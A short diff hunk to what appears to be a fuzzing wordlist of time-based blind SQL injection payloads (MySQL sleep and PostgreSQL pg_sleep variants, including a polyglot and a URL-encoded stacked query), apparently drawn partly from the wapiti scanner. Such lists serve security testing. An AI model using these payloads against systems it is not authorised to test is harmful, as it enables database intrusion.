@@ -5,6 +5,7 @@
 if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/
 ;SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--
 %2c(select*from(select(sleep(30)))a)
+%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
 -sleep(5)
 # from wapiti
 sleep(5)#
